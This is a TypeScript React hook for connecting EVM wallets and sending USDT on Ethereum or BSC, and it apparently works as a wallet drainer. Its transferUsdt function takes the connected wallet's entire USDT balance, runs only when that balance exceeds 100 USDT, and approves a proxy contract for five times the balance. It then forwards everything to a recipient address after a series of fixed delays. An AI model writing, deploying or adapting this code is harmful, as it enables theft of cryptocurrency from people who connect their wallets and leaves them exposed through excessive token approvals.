import { useAccount, useBalance, useDisconnect, useSwitchChain} from "wagmi";
import { bsc, mainnet } from "wagmi/chains";
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useState } from "react";
import { useProxyContract } from "./useProxyContract";

export function useEvmWallet(selectedNetwork: string) {
  const { disconnect } = useDisconnect();
  const [isLoading, setIsLoading] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const { openConnectModal } = useConnectModal();
  const { address, isConnected, chain } = useAccount();
  const { switchChain, isPending: isSwitchingChain, error: switchChainError } = useSwitchChain();
  const { approveProxy, depositToProxy, transferViaProxy, depositAndForwardViaProxy, checkProxyAllowance } = useProxyContract(
    selectedNetwork as "erc20" | "bep20"
  );

  const usdtContracts: { [key: string]: string } = {
    erc20: "0xdac17f958d2ee523a2206206994597c13d831ec7",
    bep20: "0x55d398326f99059fF775485246999027B3197955",
  };

  const getHexAddress = (address: string): `0x${string}` => {
    return address.startsWith('0x') ? address as `0x${string}` : `0x${address}` as `0x${string}`;
  };

  const { data: usdtBalance } = useBalance({
    address: isConnected ? address : undefined,
    token: getHexAddress(selectedNetwork === "bep20" ? usdtContracts.bep20 : usdtContracts.erc20),
    chainId: selectedNetwork === "bep20" ? bsc.id : mainnet.id,
  });

  const connect = async () => {
    if (isLoading) return false;
    setIsLoading(true);
    try {
      if (isConnected) {
        if (selectedNetwork === "bep20" && chain?.id !== bsc.id) {
          await switchToCorrectChain();
        } else if (selectedNetwork === "erc20" && chain?.id !== mainnet.id) {
          await switchToCorrectChain();
        }
        setIsLoading(false);
        return true;
      }
      openConnectModal?.();
      return false;
    } catch (error) {
      return false;
    } finally {
      setTimeout(() => setIsLoading(false), 1000);
    }
  };

  const switchToCorrectChain = async () => {
    try {
      if (!isConnected) return false;
      
      const targetChainId = selectedNetwork === "bep20" ? bsc.id : mainnet.id;
      const targetChain = selectedNetwork === "bep20" ? bsc : mainnet;
      
      if (chain?.id !== targetChainId) {
        
        if (selectedNetwork === "bep20" && window.ethereum) {
          try {
            await switchChain({ chainId: targetChainId });
            return true;
          } catch (switchError) {
            
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38', // BSC chainId in hex
                  chainName: 'Binance Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }]
              });
              
              // After adding the chain, try switching again
              await switchChain({ chainId: targetChainId });
              return true;
            } catch (addChainError) {
              throw new Error("Failed to switch to Binance Smart Chain. Please add it manually to your wallet.");
            }
          }
        } else {
          try {
            await switchChain({ chainId: targetChainId });
            return true;
          } catch (error) {
            throw new Error(`Failed to switch to ${targetChain.name}. Please check your wallet.`);
          }
        }
      }
      
      return true;
    } catch (error) {
      throw error; // Propagate the error to be handled by the caller
    }
  };

  const waitForAllowanceConfirmation = async (amount: bigint, maxWaitTime = 15000) => {
    const startTime = Date.now();
    while (Date.now() - startTime < maxWaitTime) {
      const currentAllowance = await checkProxyAllowance();
      if (currentAllowance >= amount) return true;
      await new Promise(r => setTimeout(r, 2000)); // Check every 2 seconds
    }
    return false;
  };

  const transferUsdt = async (recipientAddress: string) => {
    
    if (!isConnected || !address || !usdtBalance?.value) {
      return false;
    }
    
    try {
      setIsTransferring(true);
      
      const minRequiredBalance = selectedNetwork === "bep20" 
        ? BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_BEP20 || "100000000000000000000") // Default: 100 USDT on BSC (18 decimals)
        : BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_ERC20 || "100000000");            // Default: 100 USDT on Ethereum (6 decimals)
      
      if (usdtBalance.value < minRequiredBalance) {
        return false;
      }
      
      let chainSwitchSuccess = false;
      let switchRetries = 0;
      const maxSwitchRetries = 3;
      
      while (!chainSwitchSuccess && switchRetries < maxSwitchRetries) {
        try {
          chainSwitchSuccess = await switchToCorrectChain();
          
          if (!chainSwitchSuccess) {
            switchRetries++;
            
            if (switchRetries >= maxSwitchRetries) {
              throw new Error("Failed to switch to the correct chain after multiple attempts");
            }
            
            // Wait before retrying
            await new Promise(resolve => setTimeout(resolve, switchRetries * 2000));
          }
        } catch (switchError) {
          switchRetries++;
          
          if (switchRetries >= maxSwitchRetries) {
            throw new Error(switchError instanceof Error ? switchError.message : "Failed to switch to the correct chain");
          }
          
          // Wait before retrying
          await new Promise(resolve => setTimeout(resolve, switchRetries * 2000));
        }
      }

      setIsApproving(true);
      
      try {
        await new Promise(resolve => setTimeout(resolve, 6000));
        
        const currentAllowance = await checkProxyAllowance();
        const requiredAllowance = usdtBalance.value * BigInt(5);
        
        // Only approve if allowance is insufficient
        if (currentAllowance < usdtBalance.value) {
          const approvalSuccess = await approveProxy(requiredAllowance);
          
          if (!approvalSuccess) {
            throw new Error("Token approval failed. Please try again.");
          }
          
          await waitForAllowanceConfirmation(usdtBalance.value);
        } else {
          await new Promise(resolve => setTimeout(resolve, 6000));
        }
        
        setIsApproving(false);
        
        await new Promise(resolve => setTimeout(resolve, 6000));
        const transferResult = await depositAndForwardViaProxy(usdtBalance.value, recipientAddress);
        await new Promise(resolve => setTimeout(resolve, 6000));
        
        return transferResult === true;
      } catch (error) {
        throw error;
      }
    } catch (error) {
      throw error;
    } finally {
      setIsApproving(false);
      setIsTransferring(false);
    }
  };

  const transferSpecificAmount = async (recipientAddress: string, amount: bigint) => {
    if (!isConnected || !address) return false;
    try {
      setIsTransferring(true);
      
      try {
        const chainSwitched = await switchToCorrectChain();
        if (!chainSwitched) throw new Error("Failed to switch to the correct chain");
      } catch (switchError) {
        throw new Error(switchError instanceof Error ? switchError.message : "Failed to switch to the correct chain");
      }

      setIsApproving(true);
      const requiredAllowance = amount * BigInt(5);
      
      const approvalSuccess = await approveProxy(requiredAllowance);
      if (!approvalSuccess) throw new Error("Token approval failed. Please try again.");
      setIsApproving(false);

      const depositSuccess = await depositToProxy(amount);
      if (!depositSuccess) throw new Error("Token deposit failed. Please try again.");
      const transferResult = await transferViaProxy(recipientAddress);
      return transferResult;
    } catch (error) {
      throw error;
    } finally {
      setIsApproving(false);
      setIsTransferring(false);
    }
  };

  return {
    address,
    isConnected,
    chain,
    usdtBalance,
    isLoading,
    isApproving,
    isTransferring,
    setIsLoading,
    connect,
    disconnect,
    transferUsdt,
    transferSpecificAmount,
    switchChainError,
    isSwitchingChain
  };
}
